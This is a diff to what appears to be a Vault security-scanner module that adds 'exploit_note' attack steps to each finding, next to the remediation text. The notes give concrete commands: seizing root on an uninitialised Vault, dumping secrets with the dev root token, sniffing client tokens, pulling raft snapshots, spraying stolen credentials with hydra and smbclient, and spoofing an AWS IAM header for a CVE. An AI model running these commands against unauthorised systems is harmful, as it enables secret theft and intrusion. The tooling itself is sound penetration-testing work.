@@ -501,10 +501,12 @@ def vault_targets(hosts: list[Host]) -> list[dict]:
     return out
 
 
-def _finding(sev, title, target, detail, cmd, rem, cwes, kind=""):
+def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
+             exploit_note="", depth_tier=""):
     return {"severity": sev, "title": title, "target": target, "detail": detail,
             "tool": "vault", "command": cmd, "remediation": rem,
-            "cwes": cwes, "kind": kind}
+            "cwes": cwes, "kind": kind,
+            "exploit_note": exploit_note, "depth_tier": depth_tier}
 
 
 def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
@@ -536,7 +538,14 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Initialize Vault BEFORE binding it to a reachable interface. "
                     "Bind to loopback or a private mgmt VLAN until the operator "
                     "has completed init and stored the unseal shares safely.",
-                    ["CWE-306", "CWE-284", "CWE-665"], kind="vault_uninitialized"))
+                    ["CWE-306", "CWE-284", "CWE-665"], kind="vault_uninitialized",
+                    exploit_note=(
+                        "# DESTRUCTIVE: curl -sk -X POST -d "
+                        "'{\"secret_shares\":1,\"secret_threshold\":1}' "
+                        "https://<ip>:8200/v1/sys/init -> capture root_token + "
+                        "unseal_keys_b64[0]; then vault unseal + "
+                        "VAULT_TOKEN=<root> vault kv list."),
+                    depth_tier="t1"))
 
             if pr.get("dev_mode"):
                 out.append(_finding(
@@ -553,7 +562,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Never run `vault server -dev` outside a developer's laptop. "
                     "Deploy real storage (raft/consul/integrated) and rotate the "
                     "root token immediately after init.",
-                    ["CWE-798", "CWE-1188", "CWE-306"], kind="vault_dev_mode"))
+                    ["CWE-798", "CWE-1188", "CWE-306"], kind="vault_dev_mode",
+                    exploit_note=(
+                        "curl -sk -H 'X-Vault-Token: root' "
+                        "https://<ip>:8200/v1/sys/mounts; if 200, "
+                        "VAULT_ADDR=https://<ip>:8200 VAULT_TOKEN=root vault kv "
+                        "list secret/ and dump everything."),
+                    depth_tier="t1"))
 
             if pr.get("sealed") is False and pr.get("plaintext_listener"):
                 also = " (both http and https answer)" \
@@ -571,7 +586,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Set `tls_disable = false` on the listener and provide a "
                     "trusted certificate. Bind Vault to a segment shared only "
                     "with clients that MUST reach it.",
-                    ["CWE-319", "CWE-311"], kind="vault_unsealed_no_tls"))
+                    ["CWE-319", "CWE-311"], kind="vault_unsealed_no_tls",
+                    exploit_note=(
+                        "tcpdump -i any -A -s0 'tcp port 8200 and host <ip>' | "
+                        "grep -iE 'X-Vault-Token|s\\.[A-Za-z0-9]{24,}' — grab "
+                        "any client token then curl https://<ip>:8200/v1/sys/"
+                        "mounts -H 'X-Vault-Token: <captured>'."),
+                    depth_tier="t1"))
 
             if pr.get("pprof_reachable") or pr.get("metrics_reachable"):
                 which = []
@@ -634,7 +655,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"https://{h.ip}:{p.portid}/v1/<mount>/data/<key>",
                     "Rotate every secret dumped. Attach a policy that scopes "
                     "the token to the ONE mount it needs (no `path \"*\"`).",
-                    ["CWE-522", "CWE-200"], kind="vault_authed_secret_read"))
+                    ["CWE-522", "CWE-200"], kind="vault_authed_secret_read",
+                    exploit_note=(
+                        "For each captured vault-kv credential: hydra -L <users> "
+                        "-P <pw> ssh://<ip>; smbclient -L -U user%pass //<ip>; "
+                        "test each disclosed URL/hostname for reuse."),
+                    depth_tier="t3"))
 
             if pr.get("raft_snapshot_bytes"):
                 size = pr["raft_snapshot_bytes"]
@@ -656,7 +682,14 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Never issue root/sudo tokens to non-operator identities. "
                     "Restrict `sys/storage/raft/snapshot` in the policy attached "
                     "to CI/service tokens.",
-                    ["CWE-200", "CWE-284"], kind="vault_raft_snapshot_dump"))
+                    ["CWE-200", "CWE-284"], kind="vault_raft_snapshot_dump",
+                    exploit_note=(
+                        "curl -sk -H 'X-Vault-Token: <root>' "
+                        "https://<ip>:8200/v1/sys/storage/raft/snapshot -o "
+                        "vault.snap; then vault operator raft snapshot inspect "
+                        "vault.snap; strings vault.snap | grep -iE "
+                        "'password|token|secret'."),
+                    depth_tier="t2"))
 
             for cve in pr.get("cves", []):
                 out.append(_finding(
@@ -669,7 +702,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"# ref: https://discuss.hashicorp.com/c/security/54 - {cve['id']}",
                     "Upgrade Vault to the patched release listed in the "
                     "HCSEC bulletin.",
-                    ["CWE-1395"], kind="vault_cve"))
+                    ["CWE-1395"], kind="vault_cve",
+                    exploit_note=(
+                        "For CVE-2020-16250/16251: attempt vault write "
+                        "auth/aws/login role=<r> iam_http_request_method=POST "
+                        "...  with a spoofed X-Vault-AWS-IAM-Server-ID header — "
+                        "see HCSEC-2020-18 PoC."),
+                    depth_tier="t0"))
 
             state_bits = []
             if pr.get("sealed") is True:
